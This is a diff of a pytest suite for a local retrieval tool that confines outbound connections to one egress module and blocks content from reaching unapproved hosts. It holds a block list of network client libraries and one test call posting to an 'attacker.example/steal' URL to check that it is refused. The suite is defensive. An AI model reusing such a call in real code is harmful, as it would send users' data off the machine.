@@ -1,25 +1,30 @@
-"""The privacy guarantee: document content never leaves this machine.
+"""The privacy guarantee: content goes only to approved destinations, and
+communications never leave this machine.
 
-These tests exist because "we don't send your files to the cloud" is worth
+These tests exist because "we don't send your files anywhere else" is worth
 nothing as a comment. Each layer is asserted on its own, so removing any one of
 them fails the suite:
 
-1. **No cloud AI SDK.** No source file imports one (AST scan, function-local
-   imports included), and the lockfile contains none. The ``openai`` SDK is the
-   one exception, and only in ``embed/lmstudio.py``, which uses it as a client
-   for LM Studio's OpenAI-compatible API on loopback.
-2. **Loopback only.** Every model server URL (``ollama_host``, ``lmstudio_host``,
-   ``llama_host``) must be loopback: the configuration refuses anything else, and
-   each client re-checks the URL it is given.
-3. **A short list of network clients.** Only the modules in
-   :data:`NETWORK_CLIENTS` may import an HTTP/socket client, and each of them is
-   covered by layer 2.
-4. **Local fact extraction.** Only the local part of LangExtract is vendored; no
-   module imports the upstream package, whose provider registry routes model
-   ids to Google and OpenAI.
+1. **One choke point.** ``garage_rag/net/egress.py`` is the only module that
+   imports an outbound network client library, or a library that opens its own
+   connections (``ollama``). The AST scan covers function-local and
+   ``importlib`` imports. Inbound and local infrastructure -- the gRPC server and
+   stubs, the MCP server's uvicorn, psycopg -- are exceptions, listed by file in
+   :data:`INBOUND_OR_LOCAL`.
+2. **No cloud AI SDK**, anywhere, and none in ``uv.lock``.
+3. **Destination allowlist.** The guard approves loopback and the origins
+   configured as ``embedding.ollama_host`` / ``embedding.lmstudio_host``, and
+   refuses everything else; the clients it builds ignore proxies, never follow
+   a redirect and refuse a request to any other origin.
+4. **Content rule.** A communication is never sent to a destination that is not
+   loopback; the guard checks that before anything else.
+5. **Every caller goes through the guard** (:data:`CALLERS`), checked both by
+   reading the source and by building each client against a refused host.
+6. **Local fact extraction.** Only the local part of LangExtract is vendored, and
+   every extraction runs on one of the two local providers.
 
-The separate guard that withholds communication chunks from an off-box
-embedding provider is in ``test_embed_egress.py``.
+The backfill filter that withholds communication chunks from an off-box
+embedding provider is tested in ``test_embed_egress.py``.
 """
 
 from __future__ import annotations
@@ -27,16 +32,53 @@ from __future__ import annotations
 import ast
 import tomllib
 from pathlib import Path
+from unittest.mock import MagicMock, patch
 
 import pytest
 
-from garage_rag.config import ConfigError, NonLoopbackHost, Settings, is_loopback_url, load_config
+from garage_rag.config import Settings, reset_settings, set_settings
+from garage_rag.db.models import CorpusClass
+from garage_rag.net import egress
+from garage_rag.net.egress import EgressBlocked
 
 TESTS = Path(__file__).resolve().parent
 SRC = TESTS.parent / "src" / "garage_rag"
 LOCKFILE = TESTS.parent / "uv.lock"
+EGRESS_MODULE = "net/egress.py"
 # The one module that hands document text to (vendored) LangExtract.
 FACTS_MODULE = SRC / "enrich" / "facts.py"
+
+# Outbound network client libraries, and libraries that open their own
+# connections (the ollama SDK uses httpx inside), by import prefix.
+NETWORK_LIBRARIES = (
+    "httpx",
+    "httpx2",
+    "requests",
+    "urllib.request",
+    "urllib3",
+    "http.client",
+    "socket",
+    "aiohttp",
+    "websockets",
+    "ftplib",
+    "smtplib",
+    "xmlrpc.client",
+    "ollama",
+    "grpc",
+    "uvicorn",
+    "psycopg",
+    "psycopg_pool",
+)
+# Inbound or local-only infrastructure, allowed outside the guard file by file.
+INBOUND_OR_LOCAL = {
+    "grpc": {
+        "service/server.py",  # the gRPC server the app talks to
+        "proto/garage_pb2_grpc.py",  # generated stubs
+        "service/client.py",  # the facade's client; checks its address with egress.check_destination
+    },
+    "uvicorn": {"mcp_server/server.py"},  # serves MCP over HTTP (inbound)
+    "psycopg": {"db/engine.py", "db/migrate.py"},  # the Postgres connection
+}
 
 # Top-level packages (or dotted prefixes) of cloud AI SDKs and of libraries whose
 # purpose is calling one.
@@ -70,6 +112,7 @@ CLOUD_AI_MODULES = (
 CLOUD_AI_DISTRIBUTIONS = frozenset(
     {
         "anthropic",
+        "openai",
         "google-genai",
         "google-generativeai",
         "google-ai-generativelanguage",
@@ -93,24 +136,37 @@ CLOUD_AI_DISTRIBUTIONS = frozenset(
         "langextract",
     }
 )
-# openai: the SDK is the client for LM Studio's OpenAI-compatible API, on loopback.
-ALLOWED_CLOUD_SDK_IMPORTS = {"openai": {"embed/lmstudio.py"}}
 
-# Modules allowed to import a network client, and what each one talks to. Every
-# entry either enforces loopback or never carries document content.
-NETWORK_MODULES = ("httpx", "httpx2", "ollama", "openai", "urllib.request", "http.client", "socket", "requests",
-                   "aiohttp", "websockets", "urllib3", "grpc", "smtplib", "ftplib", "xmlrpc.client")  # fmt: skip
-NETWORK_CLIENTS = {
-    "embed/ollama.py": "Ollama embeddings; require_loopback on the host",
-    "embed/lmstudio.py": "LM Studio embeddings; require_loopback on base_url",
-    "enrich/generation.py": "rag_ask / rag_generate; require_loopback on the host",
-    "enrich/ollama_provider.py": "fact distillation on Ollama; require_loopback on model_url",
-    "xpc/llama_xpc.py": "the app's LlamaXPCService; refuses a non-loopback base_url",
-    "service/client.py": "the app's gRPC facade; require_loopback on the address",
-    "service/server.py": "the gRPC server itself (inbound)",
-    "proto/garage_pb2_grpc.py": "generated gRPC stubs",
-    "cli.py": "mcp-test probes the MCP endpoint only when it is loopback",
+# Every module that sends content out, and what it goes through.
+CALLERS = {
+    "embed/ollama.py": "egress.ollama_client",
+    "embed/lmstudio.py": "egress.http_client",
+    "embed/factory.py": "allows_communications",
+    "enrich/generation.py": "egress.ollama_client",
+    "enrich/ollama_provider.py": "egress.http_client",
+    "enrich/facts.py": "egress.check_destination",
+    "mcp_server/server.py": "egress.check_destination",
+    "xpc/llama_xpc.py": "egress.url_opener",
+    "service/client.py": "egress.check_destination",
+    "cli.py": "egress.url_opener",
 }
+
+OFF_BOX_OLLAMA = "http://gpu-box:11434"
+OFF_BOX_LMSTUDIO = "https://lmstudio.example.com/v1"
+
+
+@pytest.fixture
+def off_box_settings():
+    """Ollama and LM Studio configured on another machine."""
+    set_settings(Settings(ollama_host=OFF_BOX_OLLAMA, lmstudio_host=OFF_BOX_LMSTUDIO))
+    yield
+    reset_settings()
+
+
+@pytest.fixture(autouse=True)
+def _reset_settings():
+    yield
+    reset_settings()
 
 
 def _imported_modules(path: Path) -> set[str]:
@@ -144,18 +200,34 @@ def _sources() -> list[Path]:
     return sorted(SRC.rglob("*.py"))
 
 
-class TestNoCloudAISDK:
-    """Layer 1: nothing in the package can talk to a cloud AI API."""
+class TestChokePoint:
+    """Layer 1: only the egress module can open an outbound connection."""
 
-    def test_no_module_imports_a_cloud_ai_sdk(self) -> None:
+    def test_only_the_egress_module_imports_a_network_library(self) -> None:
         offenders = []
         for path in _sources():
             relative = path.relative_to(SRC).as_posix()
+            if relative == EGRESS_MODULE:
+                continue
             for module in _imported_modules(path):
-                sdk = _matches(module, CLOUD_AI_MODULES)
-                if sdk and relative not in ALLOWED_CLOUD_SDK_IMPORTS.get(sdk, set()):
+                library = _matches(module, NETWORK_LIBRARIES)
+                if library and relative not in INBOUND_OR_LOCAL.get(library.split(".")[0], set()):
                     offenders.append(f"{relative}: {module}")
-        assert not offenders, f"cloud AI SDK imported: {offenders}"
+        assert not offenders, (
+            f"network library imported outside {EGRESS_MODULE}: {offenders}. Build the client with "
+            "garage_rag.net.egress (http_client / ollama_client / url_opener) instead."
+        )
+
+    def test_the_egress_module_is_where_clients_come_from(self) -> None:
+        imported = _imported_modules(SRC / EGRESS_MODULE)
+        for library in ("httpx", "ollama", "urllib.request"):
+            assert library in imported
+
+    def test_the_inbound_exceptions_are_still_accurate(self) -> None:
+        """A stale exception is a hole: each listed file must still import the library."""
+        for library, files in INBOUND_OR_LOCAL.items():
+            for relative in files:
+                assert any(_matches(m, (library,)) for m in _imported_modules(SRC / relative)), relative
 
     def test_the_scan_sees_function_local_and_dynamic_imports(self, tmp_path: Path) -> None:
         sample = tmp_path / "sample.py"
@@ -163,32 +235,41 @@ class TestNoCloudAISDK:
             "import importlib\n"
             "def f():\n"
             "    import anthropic\n"
+            "    from urllib.request import urlopen\n"
             "    from google import genai\n"
-            "    return importlib.import_module('cohere')\n",
+            "    return importlib.import_module('httpx')\n",
             encoding="utf-8",
         )
-        found = {_matches(m, CLOUD_AI_MODULES) for m in _imported_modules(sample)} - {None}
-        assert found == {"anthropic", "google.genai", "cohere"}
+        modules = _imported_modules(sample)
+        assert {_matches(m, CLOUD_AI_MODULES) for m in modules} - {None} == {"anthropic", "google.genai"}
+        assert {_matches(m, NETWORK_LIBRARIES) for m in modules} - {None} == {"urllib.request", "httpx"}
 
-    def test_openai_is_only_a_loopback_client(self) -> None:
-        """The one allowed SDK is constructed with a loopback-checked base_url and no env proxies."""
-        body = (SRC / "embed" / "lmstudio.py").read_text(encoding="utf-8")
-        assert 'require_loopback(base_url or settings.lmstudio_host, "embedding.lmstudio_host")' in body
-        assert "DefaultHttpxClient(trust_env=False, follow_redirects=False)" in body
+
+class TestNoCloudAISDK:
+    """Layer 2: nothing in the package can talk to a cloud AI API."""
+
+    def test_no_module_imports_a_cloud_ai_sdk(self) -> None:
+        offenders = [
+            f"{path.relative_to(SRC).as_posix()}: {module}"
+            for path in _sources()
+            for module in _imported_modules(path)
+            if _matches(module, CLOUD_AI_MODULES)
+        ]
+        assert not offenders, f"cloud AI SDK imported: {offenders}"
 
     def test_lockfile_has_no_cloud_ai_sdk(self) -> None:
         lock = tomllib.loads(LOCKFILE.read_text(encoding="utf-8"))
         names = {package["name"] for package in lock["package"]}
         assert not names & CLOUD_AI_DISTRIBUTIONS, sorted(names & CLOUD_AI_DISTRIBUTIONS)
 
-    def test_the_egress_module_and_cloud_ocr_are_gone(self) -> None:
+    def test_cloud_ocr_is_gone(self) -> None:
         assert not (SRC / "enrich" / "egress.py").exists()
         image = (SRC / "extract" / "image.py").read_text(encoding="utf-8")
         assert "base64" not in image and "egress" not in image
 
 
-class TestLoopbackOnly:
-    """Layer 2: model servers are on this machine, by rule."""
+class TestAllowlist:
+    """Layer 3: loopback and the configured model servers, nothing else."""
 
     @pytest.mark.parametrize(
         ("url", "expected"),
@@ -200,7 +281,6 @@ class TestLoopbackOnly:
             ("http://[::1]:11434", True),
             ("http://gpu-box:11434", False),
             ("10.0.0.5:11434", False),
-            ("https://lmstudio.example.com/v1", False),
             ("http://127.example.com:11434", False),
             ("http://127.0.0.1.nip.io:11434", False),
             ("http://0.0.0.0:11434", False),
@@ -208,69 +288,176 @@ class TestLoopbackOnly:
         ],
     )
     def test_is_loopback_url(self, url: str, expected: bool) -> None:
-        assert is_loopback_url(url) is expected
+        assert egress.is_loopback_url(url) is expected
 
-    @pytest.mark.parametrize("field", ["ollama_host", "lmstudio_host", "llama_host"])
-    @pytest.mark.parametrize("url", ["http://gpu-box:11434", "https://api.openai.com/v1", "http://10.0.0.5:1234/v1"])
-    def test_settings_refuse_an_off_box_host(self, field: str, url: str) -> None:
-        with pytest.raises(ValueError, match="must be a loopback URL"):
-            Settings(**{field: url})
+    @pytest.mark.parametrize("url", ["http://localhost:11434", "http://127.0.0.1:8790/v1", "http://[::1]:1234"])
+    def test_loopback_is_approved(self, url: str) -> None:
+        assert egress.check_destination(url, purpose="test", settings=Settings()) == url
 
-    def test_config_file_with_an_off_box_host_does_not_load(self, tmp_path: Path) -> None:
-        path = tmp_path / "garage.json"
-        path.write_text('{"embedding": {"ollama_host": "http://gpu-box:11434"}}', encoding="utf-8")
-        with pytest.raises(ConfigError, match="embedding.ollama_host must be a loopback URL"):
-            load_config(path)
+    @pytest.mark.parametrize(
+        "url",
+        [
+            OFF_BOX_OLLAMA,
+            "gpu-box:11434",  # the same origin written as a bare host:port
+            "http://GPU-BOX:11434/api/embed",
+            OFF_BOX_LMSTUDIO,
+            "https://lmstudio.example.com:443/v1/embeddings",
+        ],
+    )
+    def test_configured_model_servers_are_approved(self, url: str) -> None:
+        settings = Settings(ollama_host=OFF_BOX_OLLAMA, lmstudio_host=OFF_BOX_LMSTUDIO)
+        egress.check_destination(url, purpose="test", settings=settings)
 
-    def test_ollama_embedder_refuses_an_off_box_host(self) -> None:
-        from garage_rag.embed.ollama import OllamaEmbedder
+    @pytest.mark.parametrize(
+        "url",
+        [
+            "https://api.openai.com/v1",
+            "https://api.anthropic.com",
+            "http://gpu-box:11435",  # right host, wrong port
+            "https://gpu-box:11434",  # right host and port, wrong scheme
+            "http://lmstudio.example.com/v1",  # configured as https
+            "http://other-box:11434",
+            "ftp://gpu-box:11434",
+            "not a url at all",
+        ],
+    )
+    def test_anything_else_is_refused(self, url: str) -> None:
+        settings = Settings(ollama_host=OFF_BOX_OLLAMA, lmstudio_host=OFF_BOX_LMSTUDIO)
+        with pytest.raises(EgressBlocked, match="not an approved destination"):
+            egress.check_destination(url, purpose="test", settings=settings)
 
-        with pytest.raises(NonLoopbackHost):
-            OllamaEmbedder("nomic-embed-text", host="http://gpu-box:11434")
+    def test_approved_destinations_are_only_the_configured_servers(self) -> None:
+        settings = Settings(ollama_host=OFF_BOX_OLLAMA, lmstudio_host=OFF_BOX_LMSTUDIO)
+        assert egress.approved_destinations(settings) == [OFF_BOX_OLLAMA, OFF_BOX_LMSTUDIO]
 
-    def test_lmstudio_embedder_refuses_an_off_box_host(self) -> None:
-        from garage_rag.embed.lmstudio import LMStudioEmbedder
+    def test_loopback_only_refuses_a_configured_off_box_server(self) -> None:
+        settings = Settings(ollama_host=OFF_BOX_OLLAMA)
+        with pytest.raises(EgressBlocked, match="must be a loopback URL"):
+            egress.check_destination(OFF_BOX_OLLAMA, purpose="test", loopback_only=True, settings=settings)
 
-        with pytest.raises(NonLoopbackHost):
-            LMStudioEmbedder("text-embedding", base_url="https://api.openai.com/v1")
+    def test_llama_host_must_be_loopback(self) -> None:
+        with pytest.raises(ValueError, match="llama_host must be a loopback URL"):
+            Settings(llama_host="http://llama.example:8790")
 
-    def test_fact_provider_refuses_an_off_box_host(self) -> None:
-        from garage_rag.enrich.ollama_provider import OllamaLanguageModel
+    def test_http_client_is_pinned_to_its_origin(self, off_box_settings) -> None:
+        client = egress.http_client(purpose="test", base_url=OFF_BOX_OLLAMA)
+        assert client.follow_redirects is False
+        assert client._trust_env is False
+        with pytest.raises(EgressBlocked, match="leaves the approved origin"):
+            client.post("http://attacker.example/steal", json={})
 
-        with pytest.raises(NonLoopbackHost):
-            OllamaLanguageModel("gemma2:2b", "http://gpu-box:11434")
+    def test_url_opener_is_pinned_to_its_origin(self) -> None:
+        opener = egress.url_opener(purpose="test", base_url="http://127.0.0.1:8790")
+        with pytest.raises(EgressBlocked, match="leaves the approved origin"):
+            opener.request("GET", "http://127.0.0.1:9999/other", timeout=1)
 
-    def test_fact_extraction_refuses_an_off_box_host_before_touching_facts(self) -> None:
-        from unittest.mock import MagicMock
 
-        from garage_rag.db.models import CorpusClass, Document
+class TestContentRule:
+    """Layer 4: communications stay on this machine, whatever else is approved."""
+
+    def test_communications_are_refused_off_box_even_to_a_configured_server(self) -> None:
+        settings = Settings(ollama_host=OFF_BOX_OLLAMA)
+        with pytest.raises(EgressBlocked, match="communications may never be sent off this machine"):
+            egress.check_destination(
+                OFF_BOX_OLLAMA, purpose="test", corpus_class=CorpusClass.COMMUNICATION, settings=settings
+            )
+
+    def test_the_content_rule_is_checked_first(self) -> None:
+        """An unapproved host fails with the content rule's message, not the allowlist's."""
+        with pytest.raises(EgressBlocked, match="communications may never"):
+            egress.check_destination("https://api.example.com", purpose="test", corpus_class=CorpusClass.COMMUNICATION)
+
+    @pytest.mark.parametrize("klass", [CorpusClass.DOCUMENT, CorpusClass.CODE])
+    def test_other_classes_may_go_to_a_configured_server(self, klass: CorpusClass) -> None:
+        settings = Settings(ollama_host=OFF_BOX_OLLAMA)
+        egress.check_destination(OFF_BOX_OLLAMA, purpose="test", corpus_class=klass, settings=settings)
+
+    def test_communications_may_go_to_loopback(self) -> None:
+        egress.check_destination("http://localhost:11434", purpose="test", corpus_class=CorpusClass.COMMUNICATION)
+        assert egress.allows_communications("http://127.0.0.1:1234/v1")
+        assert not egress.allows_communications(OFF_BOX_OLLAMA)
+
+    def test_http_client_applies_the_content_rule(self, off_box_settings) -> None:
+        with pytest.raises(EgressBlocked, match="communications"):
+            egress.http_client(purpose="test", base_url=OFF_BOX_OLLAMA, corpus_class=CorpusClass.COMMUNICATION)
+
+    def test_fact_extraction_refuses_a_communication_before_touching_facts(self, off_box_settings) -> None:
+        from garage_rag.db.models import Document
         from garage_rag.enrich.facts import extract_and_store_facts
 
         session = MagicMock()
-        document = Document(id=1, content="text", corpus_class=CorpusClass.DOCUMENT)
-        with pytest.raises(NonLoopbackHost):
-            extract_and_store_facts(session, document, model_url="http://gpu-box:11434")
+        document = Document(id=1, content="text", corpus_class=CorpusClass.COMMUNICATION)
+        with pytest.raises(EgressBlocked, match="communications"):
+            extract_and_store_facts(session, document, provider="ollama")
         session.query.assert_not_called()
 
-    def test_llama_client_refuses_an_off_box_host(self) -> None:
+    def test_rag_ask_refuses_a_communication_for_an_off_box_model(self, off_box_settings) -> None:
+        from garage_rag.mcp_server.server import rag_ask
+
+        set_settings(Settings(fact_provider="ollama", ollama_host=OFF_BOX_OLLAMA))
+        hit = MagicMock(corpus_class="communication")
+        with (
+            patch("garage_rag.mcp_server.server._retrieve", return_value=([hit], None)),
+            patch("garage_rag.enrich.generation.LocalChatModel.complete") as complete,
+            pytest.raises(EgressBlocked, match="communications"),
+        ):
+            rag_ask(question="q")
+        complete.assert_not_called()
+
+
+class TestEveryCallerGoesThroughTheGuard:
+    """Layer 5."""
+
+    @pytest.mark.parametrize(("module", "call"), sorted(CALLERS.items()))
+    def test_caller_uses_the_guard(self, module: str, call: str) -> None:
+        assert call in (SRC / module).read_text(encoding="utf-8"), f"{module} must go through {call}"
+
+    def test_ollama_embedder(self) -> None:
+        from garage_rag.embed.ollama import OllamaEmbedder
+
+        with pytest.raises(EgressBlocked):
+            OllamaEmbedder("nomic-embed-text", host="http://gpu-box:11434")
+
+    def test_lmstudio_embedder(self) -> None:
+        from garage_rag.embed.lmstudio import LMStudioEmbedder
+
+        with pytest.raises(EgressBlocked):
+            LMStudioEmbedder("text-embedding", base_url="https://api.openai.com/v1")
+
+    def test_fact_provider(self) -> None:
+        from garage_rag.enrich.ollama_provider import OllamaLanguageModel
+
+        with pytest.raises(EgressBlocked):
+            OllamaLanguageModel("gemma2:2b", "http://gpu-box:11434")
+
+    def test_chat_model(self) -> None:
+        from garage_rag.enrich.generation import LocalChatModel
+
+        LocalChatModel(settings=Settings(fact_provider="ollama", ollama_host=OFF_BOX_OLLAMA))  # configured: approved
+        with (
+            patch("garage_rag.net.egress.approved_destinations", return_value=[]),
+            pytest.raises(EgressBlocked),
+        ):
+            LocalChatModel(settings=Settings(fact_provider="ollama", ollama_host=OFF_BOX_OLLAMA))
+
+    def test_llama_client(self) -> None:
         from garage_rag.xpc.llama_xpc import LlamaXPCClient, LlamaXPCError
 
         with pytest.raises(LlamaXPCError, match="loopback"):
             LlamaXPCClient("http://gpu-box:8790")
 
-    def test_chat_model_refuses_an_off_box_host(self) -> None:
-        """Settings validation is the first line; LocalChatModel checks again."""
-        from garage_rag.enrich.generation import LocalChatModel
-
-        settings = Settings.model_construct(fact_provider="ollama", ollama_host="http://gpu-box:11434")
-        with pytest.raises(NonLoopbackHost):
-            LocalChatModel(settings=settings)
-
-    def test_grpc_client_refuses_an_off_box_address(self) -> None:
+    def test_grpc_client(self) -> None:
         from garage_rag.service.client import GarageClient
 
-        with pytest.raises(NonLoopbackHost):
+        with pytest.raises(EgressBlocked):
             GarageClient(host="10.0.0.5", port=50051, in_process=False)._get_stub()
+
+    def test_embedding_backfill_asks_the_guard(self, off_box_settings) -> None:
+        from garage_rag.embed.factory import provider_is_local
+
+        assert not provider_is_local("ollama")
+        assert not provider_is_local("lmstudio")
+        assert provider_is_local("llama_xpc")
 
 
 @pytest.fixture
@@ -322,7 +509,7 @@ def redirecting_server():
 
 
 class TestNoRedirects:
-    """A model server on loopback cannot bounce document text somewhere else."""
+    """A model server cannot bounce content somewhere else."""
 
     def test_ollama_embedder(self, redirecting_server) -> None:
         from garage_rag.embed.ollama import OllamaEmbedder
@@ -336,10 +523,8 @@ class TestNoRedirects:
         from garage_rag.embed.lmstudio import LMStudioEmbedder
 
         url, hits = redirecting_server
-        embedder = LMStudioEmbedder("m", base_url=f"{url}/v1")
-        embedder._client = embedder._client.with_options(max_retries=0)
-        with pytest.raises(Exception):  # noqa: B017
-            embedder.embed(["secret text"])
+        with patch("garage_rag.embed.lmstudio.time.sleep"), pytest.raises(Exception):  # noqa: B017
+            LMStudioEmbedder("m", base_url=f"{url}/v1").embed(["secret text"])
         assert hits == []
 
     def test_fact_provider(self, redirecting_server) -> None:
@@ -371,30 +556,8 @@ class TestNoRedirects:
         assert hits == []
 
 
-class TestNetworkClients:
-    """Layer 3: a new network client cannot appear without review."""
-
-    def test_only_listed_modules_import_a_network_client(self) -> None:
-        importers = {}
-        for path in _sources():
-            found = sorted({p for m in _imported_modules(path) if (p := _matches(m, NETWORK_MODULES))})
-            if found:
-                importers[path.relative_to(SRC).as_posix()] = found
-        unexpected = {path: modules for path, modules in importers.items() if path not in NETWORK_CLIENTS}
-        assert not unexpected, (
-            f"new network client(s): {unexpected}. Enforce loopback (garage_rag.config.require_loopback) "
-            "and add the module to NETWORK_CLIENTS with what it talks to."
-        )
-
-    @pytest.mark.parametrize(
-        "module", ["embed/ollama.py", "embed/lmstudio.py", "enrich/generation.py", "enrich/ollama_provider.py"]
-    )
-    def test_model_clients_check_loopback(self, module: str) -> None:
-        assert "require_loopback(" in (SRC / module).read_text(encoding="utf-8")
-
-
 class TestFactExtractionStaysLocal:
-    """Layer 4. Upstream LangExtract picks a *cloud* backend by regex on
+    """Layer 6. Upstream LangExtract picks a *cloud* backend by regex on
     ``model_id`` (``gemini*`` -> Google, ``gpt-*`` -> OpenAI). Only the local
     part is vendored (``enrich/langextract``); no module imports the upstream
     package, the vendored copy has no provider routing, and every extraction
@@ -450,7 +613,7 @@ class BlockPsycopg:
         return None
 
 sys.meta_path.insert(0, BlockPsycopg())
-import garage_rag.config
+import garage_rag.net.egress
 import garage_rag.ops.sources
 import garage_rag.search.hybrid
 import garage_rag.enrich.facts
